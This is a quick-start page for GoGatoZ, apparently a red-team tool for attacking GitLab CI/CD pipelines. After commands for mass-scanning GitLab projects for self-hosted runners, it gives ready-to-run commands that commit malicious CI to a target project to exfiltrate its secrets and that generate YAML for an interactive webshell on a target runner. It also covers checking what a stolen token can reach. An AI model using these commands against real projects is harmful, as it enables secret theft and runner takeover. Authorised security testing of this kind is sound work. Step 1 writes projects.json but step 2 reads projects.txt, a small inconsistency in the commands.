---
title: Quick Start Guide
description: Get started with GoGatoZ quickly for common use cases
---

This guide will help you get started with GoGatoZ quickly for common use cases.

## Prerequisites

Before you begin, make sure you have:

1. Installed GoGatoZ (see [Installation](/user-guide/installation/))
2. Created a GitLab PAT with appropriate scopes (`api`, `read_repository`)
3. Set the `GITLAB_TOKEN` environment variable with your PAT

## Search For GitLab CI/CD Vulnerabilities at Scale

This workflow demonstrates how to scan a large number of GitLab projects for potential vulnerabilities:

### Step 1: Search for candidate projects

```bash
gogatoz search --query "runner" --per-page 50 --max-pages 5 --json > projects.json
```

This command:
- Uses the search command with GitLab project search
- Searches for projects mentioning "runner" (potential self-hosted runners)
- Outputs the results to a JSON file (`projects.json`)

### Step 2: Enumerate the projects for vulnerabilities

```bash
gogatoz enumerate --input projects.txt --concurrency 16 --json | tee gogatoz_output.json
```

This command:
- Uses the enumerate command
- Processes all projects from the file (`--input projects.txt`)
- Uses 16 concurrent workers for fast scanning
- Saves the output to a file while displaying it in the terminal

## Perform Self-Hosted Runner Attack

To perform a GitLab Runner attack on a target project:

### Prerequisites

- A GitLab PAT with `api`, `read_repository`, and `write_repository` scopes
- The PAT should be for an account that has push access to the target project

### Execute secrets exfiltration attack

```bash
gogatoz attack --target group/project --secrets --commit --branch exfil-branch --tags self-hosted
```

This command:
- Uses the attack command
- Targets a specific project (`group/project`)
- Creates a pipeline to exfiltrate secrets
- Commits the malicious CI to a branch
- Targets self-hosted runners with specified tags

### Generate a webshell payload

```bash
gogatoz attack --target group/project --payload-only --tags runner-tag --job-name shell
```

This command outputs a GitLab CI YAML that you can use to deploy an interactive shell on a target runner.

## Post-Compromise Enumeration

If you have obtained a GitLab PAT, you can use GoGatoZ to validate it and identify what it has access to:

```bash
gogatoz search --query "your-search" --json
```

This command:
- Uses the search command to discover accessible projects
- Identifies projects the PAT can access
- Can be combined with enumerate to assess CI/CD configurations

## Additional Options

For more detailed information about each command and its options, see the [Command Reference](/user-guide/command-reference/) section.
